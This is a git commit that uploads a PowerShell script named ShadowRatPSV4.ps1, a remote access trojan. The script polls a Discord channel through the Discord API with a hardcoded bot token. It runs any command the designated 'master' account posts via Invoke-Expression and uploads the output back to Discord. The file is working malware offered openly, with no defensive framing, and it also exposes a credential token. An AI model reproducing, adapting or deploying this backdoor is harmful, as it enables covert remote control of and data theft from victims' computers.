c0c460fcd78df266f33eaecdc85d8f12fedb79b1
llc1234 <93080319+llc1234@users.noreply.github.com>
2024-02-26 02:21:39 +0100

    Add files via upload

---
+++ ShadowRatPSV4.ps1
@@ -0,0 +1,70 @@
+Start-Sleep -Seconds 15
+
+$WhoAmI_Output = Invoke-Expression -Command "whoami"
+
+$url = "https://discord.com/api/v9/channels/1210194870850031656/messages"
+$discordToken = "MTE5ODY3Njc4NTg5MDYwNzE3Nw.GnqMWY.3rwKiCVRerCjS_meDerhJDfubEZWbrwbrsYA_k"
+
+$master_ID = "1198676785890607177"
+
+$headers = @{
+    Authorization = $discordToken
+}
+
+while ($true) {
+    Start-Sleep -Seconds 15
+
+    $response = Invoke-WebRequest -Uri ($url + "?limit=1") -Headers $headers
+
+    if ($response.StatusCode -eq 200) {
+        $messageData = $response.Content | ConvertFrom-Json
+
+        $start_w = "<" + $WhoAmI_Output + ">*"
+
+        if ($messageData[0].author.id -eq $master_ID) {
+            if ($messageData[0].content -like "<ping>*") {
+                Start-Sleep -Seconds 25
+
+                $body = @{
+                    "content" = $WhoAmI_Output
+                }
+    
+                $bodyJson = $body | ConvertTo-Json
+                Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"
+        
+
+            } elseif ($messageData[0].content -like $start_w) {
+                $shellCommand = $messageData[0].content.Substring($WhoAmI_Output.Length + 2)
+            
+                Try {
+                    $result = Invoke-Expression $shellCommand 2>&1 | Out-String;
+
+                    $boundary = [System.Guid]::NewGuid().ToString()
+
+                    $body = @"
+--$boundary
+Content-Disposition: form-data; name="file"; filename="shell.txt"
+Content-Type: application/octet-stream
+
+$result
+--$boundary
+Content-Disposition: form-data; name="content"
+
+shell output:
+--$boundary--
+"@
+
+                    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $body -ContentType "multipart/form-data; boundary=$boundary"
+
+                } catch {
+                    $body = @{
+                        "content" = $_.Exception.Message
+                    }
+        
+                    $bodyJson = $body | ConvertTo-Json
+                    Invoke-RestMethod -Uri $url -Method Post -Headers $headers -Body $bodyJson -ContentType "application/json"
+                }
+            }
+        }
+    }
+}
